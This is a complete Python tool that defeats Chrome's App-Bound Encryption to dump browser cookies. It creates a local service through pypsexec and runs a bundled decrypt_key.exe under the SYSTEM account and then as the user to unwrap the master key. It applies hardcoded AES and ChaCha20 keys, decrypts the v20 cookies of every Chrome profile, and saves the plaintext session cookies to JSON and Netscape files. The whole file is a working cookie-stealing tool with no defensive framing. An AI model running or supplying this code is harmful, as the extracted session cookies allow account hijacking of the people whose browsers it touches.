import ctypes
import sys
import os
import json
import binascii
import shutil
from pypsexec.client import Client
from pypsexec.exceptions import SCMRException
from Crypto.Cipher import AES, ChaCha20_Poly1305
import sqlite3
import pathlib
from datetime import datetime, timedelta, timezone
import glob
import traceback
import time

MAX_RETRIES = 5
RETRY_DELAY = 3  # seconds

def get_decrypt_exe_path():
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, "decrypt_key.exe")
    return os.path.join(os.getcwd(), "decrypt_key.exe")

def run_main_logic():
    decrypt_exe = get_decrypt_exe_path()

    if not os.path.exists(decrypt_exe):
        raise FileNotFoundError("❌ decrypt_key.exe not found. Please bundle or place it with the main executable.")

    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    chrome_user_data_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"

    profile_paths = glob.glob(os.path.join(chrome_user_data_path, "Profile *"))
    profile_paths.append(os.path.join(chrome_user_data_path, "Default"))

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]

    c = Client("localhost")
    c.connect()

    try:
        c.create_service()

        assert binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB"
        app_bound_encrypted_key_b64 = binascii.b2a_base64(
            binascii.a2b_base64(app_bound_encrypted_key)[4:]
        ).decode().strip()

        # First decrypt with SYSTEM
        encrypted_key_b64, stderr, rc = c.run_executable(
            decrypt_exe,
            arguments=app_bound_encrypted_key_b64,
            use_system_account=True
        )

        # Second decrypt with user
        decrypted_key_b64, stderr, rc = c.run_executable(
            decrypt_exe,
            arguments=encrypted_key_b64.decode().strip(),
            use_system_account=False
        )

        if not decrypted_key_b64.strip():
            raise ValueError("Decryption subprocess returned empty output.")

        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]

    finally:
        try:
            time.sleep(2)
            c.remove_service()
        except SCMRException as e:
            if "1072" in str(e):
                print("⚠️ Service already marked for deletion. Skipping remove_service().")
            else:
                raise
        finally:
            c.disconnect()

    aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787") # Replace with latest AES Master Key
    chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660") # Replace with latest ChaCha Master Key

    flag = decrypted_key[0]
    iv = decrypted_key[1:1 + 12]
    ciphertext = decrypted_key[1 + 12:1 + 12 + 32]
    tag = decrypted_key[1 + 12 + 32:]

    if flag == 1:
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    elif flag in (2, 204):
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
    else:
        raise ValueError(f"Unsupported flag: {flag}")

    key = cipher.decrypt_and_verify(ciphertext, tag)

    def decrypt_cookie_v20(encrypted_value):
        cookie_iv = encrypted_value[3:3 + 12]
        encrypted_cookie = encrypted_value[3 + 12:-16]
        cookie_tag = encrypted_value[-16:]
        cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)
        decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
        return decrypted_cookie[32:].decode('utf-8')

    for profile_path in profile_paths:
        profile_name = os.path.basename(profile_path).replace(" ", "_")
        cookie_db_path = os.path.join(profile_path, "Network", "Cookies")
        if os.path.exists(cookie_db_path):
            print(f"🔍 Processing profile: {profile_path}")
            json_cookies = []
            netscape_cookies = []

            try:
                con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
                cur = con.cursor()
                r = cur.execute("SELECT host_key, name, path, is_secure, expires_utc, is_httponly, samesite, CAST(encrypted_value AS BLOB) from cookies;")
                cookies = cur.fetchall()
                cookies_v20 = [c for c in cookies if c[7][:3] == b"v20"]
                con.close()

                for c in cookies_v20:
                    host_key, name, path, is_secure, expires_utc, is_httponly, samesite_code, encrypted_value = c

                    try:
                        value = decrypt_cookie_v20(encrypted_value)
                        expiration_date = None
                        if expires_utc > 0:
                            expiration_date = int((datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=expires_utc)).timestamp())

                        http_only = bool(is_httponly)
                        secure = bool(is_secure)
                        host_only = not host_key.startswith('.')

                        samesite = "unspecified"
                        if samesite_code == 1:
                            samesite = "lax"
                        elif samesite_code == 2:
                            samesite = "strict"

                        json_cookies.append({
                            "domain": host_key,
                            "expirationDate": expiration_date,
                            "hostOnly": host_only,
                            "httpOnly": http_only,
                            "name": name,
                            "path": path,
                            "sameSite": samesite,
                            "secure": secure,
                            "session": expiration_date is None,
                            "storeId": "0",
                            "value": value
                        })

                        netscape_expires = int(expires_utc / 1000000) if expires_utc > 0 else 0
                        netscape_cookies.append(f"{host_key}\t{'TRUE' if host_only else 'FALSE'}\t{path}\t{'TRUE' if secure else 'FALSE'}\t{netscape_expires}\t{name}\t{value}")

                    except Exception as e:
                        print(f"❌ Error decrypting cookie: {host_key} - {name} in profile '{profile_name}': {e}")

                json_filename = f"{profile_name}_cookies.json"
                with open(json_filename, "w") as f:
                    json.dump(json_cookies, f, indent=4)
                print(f"✅ Cookies saved to {json_filename}")

                netscape_filename = f"{profile_name}_cookies.txt"
                with open(netscape_filename, "w") as f:
                    f.write("# Netscape HTTP Cookie File\n")
                    for cookie_line in netscape_cookies:
                        f.write(cookie_line + "\n")
                print(f"✅ Cookies saved to {netscape_filename} (Netscape format)")

            except sqlite3.Error as e:
                print(f"❌ DB access error for profile '{profile_name}': {e}")
        else:
            print(f"⚠️ No cookies DB found for profile: {profile_path}")

    print("\n🎉 Done! Cookies saved from all profiles.")
    input("Press Enter to exit...")


def main():
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            print(f"🔁 Attempt {attempt} of {MAX_RETRIES}")
            run_main_logic()
            break  # Success
        except Exception:
            print(f"\n❌ Attempt {attempt} failed with error:\n")
            traceback.print_exc()
            if attempt < MAX_RETRIES:
                print(f"⏳ Retrying in {RETRY_DELAY} seconds...\n")
                time.sleep(RETRY_DELAY)
            else:
                print("🚫 Max retries reached. Exiting.")
                input("Press Enter to exit...")


if __name__ == "__main__":
    main()
